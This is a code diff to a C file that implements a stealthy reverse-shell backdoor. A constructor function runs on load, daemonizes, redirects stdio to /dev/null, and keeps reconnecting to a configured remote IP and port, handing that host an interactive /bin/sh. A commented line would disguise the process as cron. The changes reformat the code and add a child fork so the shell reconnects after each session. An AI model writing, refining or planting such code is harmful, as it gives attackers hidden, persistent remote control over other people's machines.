@@ -11,37 +11,40 @@
 #include <errno.h>
 #include <string.h>
 #include <sys/prctl.h>
+#include <signal.h>
 #include "config.h"
 
 __attribute__((constructor))
-void stealth_shell() {
+void stealth_shell()
+{
     pid_t pid = fork();
     if (pid < 0)
     {
-        PERROR("fork failed");
+        perror("fork failed");
         return;
     }
-    if (pid > 0) exit(0);      // parent exits immediately
+    if (pid > 0) exit(0);  // Parent exits
 
-    // Child process continues:
-    setsid();                  // detach from terminal
+    setsid();
     chdir("/");
 
-    // Rename process to "systemd" (or other innocuous name)
+    // Rename process to "/usr/sbin/cron" (or other innocuous name)
     // prctl(PR_SET_NAME, "/usr/sbin/cron", 0, 0, 0);
 
-    // Redirect std fds to /dev/null initially
     int nullfd = open("/dev/null", O_RDWR);
-    if (nullfd >= 0) {
+    if (nullfd >= 0)
+    {
         dup2(nullfd, 0);
         dup2(nullfd, 1);
         dup2(nullfd, 2);
         if (nullfd > 2) close(nullfd);
     }
 
-    while (1) {
+    while (1)
+    {
         int sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock == -1) {
+        if (sock == -1)
+        {
             sleep(RECONNECT_DELAY);
             continue;
         }
@@ -51,22 +54,33 @@ void stealth_shell() {
         sa.sin_port = htons(REMOTE_PORT);
         sa.sin_addr.s_addr = inet_addr(REMOTE_IP);
 
-        if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) == 0) {
-            // Redirect socket to stdio
-            dup2(sock, 0);
-            dup2(sock, 1);
-            dup2(sock, 2);
-            if (sock > 2) close(sock);
+        if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) == 0)
+        {
+            pid_t child = fork();
+            if (child == 0)
+            {
+                // In child: run shell with socket fds
+                dup2(sock, 0);
+                dup2(sock, 1);
+                dup2(sock, 2);
+                if (sock > 2) close(sock);
 
-            // Prepare argv with custom name
-            char *const argv[] = {"/usr/sbin/cron", NULL};
-            execve("/bin/sh", argv, NULL);
-
-            // If execve fails:
-            close(sock);
-        } else {
-            close(sock);
+                char *const argv[] = {"/bin/sh", NULL};
+                execve("/bin/sh", argv, NULL);
+                exit(1); // In case execve fails
+            }
+            else if (child > 0)
+            {
+                // Parent: wait for child to exit then reconnect
+                waitpid(child, NULL, 0);
+                close(sock);
+            }
+            else // Fork failed
+                close(sock);
         }
+        else
+            close(sock);
+
         sleep(RECONNECT_DELAY);
     }
 }
